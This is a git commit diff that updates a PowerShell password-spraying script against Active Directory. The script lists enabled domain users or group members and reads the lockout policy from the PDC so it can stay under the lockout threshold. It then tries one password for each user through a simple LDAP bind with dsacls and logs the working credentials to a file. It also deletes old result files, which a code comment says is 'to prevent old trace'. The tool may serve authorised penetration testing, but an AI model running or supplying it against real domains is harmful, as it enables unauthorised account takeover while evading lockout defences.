954b4f0b9b3cd1232590e1b1200b799a55e90e42
TalkL3ss <30426929+TalkL3ss@users.noreply.github.com>
2022-09-18 19:38:39 +0300

    Update PasswordSpray.ps1
    Comments added,
    Added support to large domains,
    Added password change date,
    Added password masking in the log

--- PasswordSpray.ps1
+++ PasswordSpray.ps1
@@ -1,27 +1,85 @@
-$Domain = ((cmd /c set u)[-3] -split "=")[-1]
-$PDC = ((nltest.exe /dcname:$Domain) -split "\\\\")[1]
-$lockoutBadPwdCount = ((net accounts /domain)[7] -split ":" -replace " ","")[1]
-$GroupToCheck = "Domain Admins"
-$UsersToCheck = (Get-ADGroupMember -Recursive $GroupToCheck).SamAccountName | % {(Get-ADUser -Properties Enabled -Identity $_).Samaccountname}
-$password = "Aa123456"
-$UsersWithPassFile = 'c:\temp\UsersFound.txt'
+#TODO: Add Check if the user is a Domain admin/Account Operator
 
-if (Test-Path $UsersWithPassFile) { 
-    
+#TODO: Add Reading users from file if needed
+
+#TODO: Add Reading passwords from file (need to sleep between users to prevent locks and script malfunction
+
+#----Internal Section DONOT Change---
+
+$Domain = ((cmd /c set u)[-3] -split "=")[-1] #Get domain name
+
+$PDC = ((nltest.exe /dcname:$Domain) -split "\\\\")[1] #Get The PDC Emulator Role Holder Bad password Count to prevent locks
+
+$lockoutBadPwdCount = ((net accounts /domain)[7] -split ":" -replace " ","")[1] #Get password policy to prevent locks of the users
+
+#---Changes Bellow this line is allowed----
+
+$GroupToCheck = "studentha" #Defined All if needed to get all the domain users or any other group
+
+if ($GroupToCheck.ToLower() -eq "all") {
+
+    $UsersToCheck = (Get-ADUser -SearchBase $(Get-ADDomain).DistinguishedName -Filter * -Properties Enabled | ? {$_.Enabled}).SamAccountName #get all enabled users in the domain bypass limits on the results
+
+} else {
+
+    $UsersToCheck = (Get-ADGroupMember -Recursive $GroupToCheck ).SamAccountName | % {(Get-ADUser -Properties Enabled -Identity $_).Samaccountname} #get all enabled users within specific group
+
 }
 
+$password = "xxxxxxx" #defined the one password that you want to check
+
+$UsersWithPassFile = 'c:\temp\UsersFound.txt' #set the location and the file name of the results file
+
+$noPassInFile = $false #flag to control if password is needed in the log file, set to $false if no password is needed
+
+ 
+
+if (Test-Path $UsersWithPassFile) {
+
+rm $UsersWithPassFile -Force #delete the old file to prevent old tarce
+
+}
+
+ 
+
 $UsersToCheck | % {
-    $badPwdCount = Get-ADObject -SearchBase $((Get-ADUser $_).DistinguishedName) -Filter * -Properties badpwdcount -Server $PDC | Select-Object -ExpandProperty badpwdcount
-    if ($badPwdCount -lt $lockoutBadPwdCount - 3) {
-        $DoaminAdminLoc = "{0},{1}" -f "CN=domain admins",$(Get-ADDomain).UsersContainer
-        $UserUPN = "{0}@{1}" -f $_,$(Get-ADDomain).DNSRoot
-        $isInvalid = dsacls.exe $DoaminAdminLoc /user:$UserUPN /passwd:$password /simple| select-string -pattern "Invalid Credentials"
+
+    #line bellow is to get the badpassword count and password last set time and date
+
+    $badPwdCount = Get-ADObject -SearchBase $((Get-ADUser $_).DistinguishedName) -Filter * -Properties badpwdcount,pwdLastSet -Server $PDC | select DistinguishedName,Name,@{N='PasswordDate';Exp={[datetime]::FromFileTime($_.pwdLastSet).ToString('dd-MM-yyyy hh:mm:ss')}},badpwdcount
+
+    if ($badPwdCount.badpwdcount -lt $lockoutBadPwdCount - 3) { #this line to prevent locks in the domain
+
+        $DoaminAdminLoc = "{0},{1}" -f "CN=Domain Admins",$(Get-ADDomain).UsersContainer #get the 'domain admins' group DN for checking for working creds
+
+        $UserUPN = "{0}@{1}" -f $_,$(Get-ADDomain).DNSRoot #get the user UPN for authenticate to AD with the $password
+
+        $isInvalid = dsacls.exe $DoaminAdminLoc /user:$UserUPN /passwd:$password /simple| select-string -pattern "Invalid Credentials" #try connect to AD with the user (UPN) and $password in simple LDAP bind, and looking for "Invalid Credentials", if $null the User and the password are correct
+
         if ($isInvalid -match "Invalid") {
-            Write-Host "[-] Invalid Credentials for $_ : $password" -foreground red
+
+            Write-Host "[-] Invalid Credentials for $_ : $password : PasswordCount: "$badPwdCount.badpwdcount -foreground red #write to screen if the credentials are invalid and the bad password count for controlling and debugging
+
         } else {
-            Write-Host "[+] Working Credentials for $_ : $password" -foreground green
-            $finding = "User: {0} With Password {1}" -f $_,$password
-            Write-Output $finding | tee $UsersWithPassFile -Append
-        }        
+
+            Write-Host "[+] Working Credentials for $_ : $password PasswordLastSet: " $badPwdCount.PasswordDate -foreground green #write to screen if the password has been worked and the password last set date
+
+            if ($noPassInFile) {
+
+                    $finding = "User: {0} With Password {1} PasswordLastSet: {2}" -f $_,$password,$badPwdCount.PasswordDate #create format to write to the file
+
+                }
+
+                else {
+
+                    $finding = "User: {0} With Password {1} PasswordLastSet: {2}" -f $_,"******",$badPwdCount.PasswordDate #create format to write to the file
+
+                }
+
+            Write-Output $finding | tee $UsersWithPassFile -Append | Out-Null #write to file all good credentials to $UsersWithPassFile file
+
+        }       
+
     }
+
 }
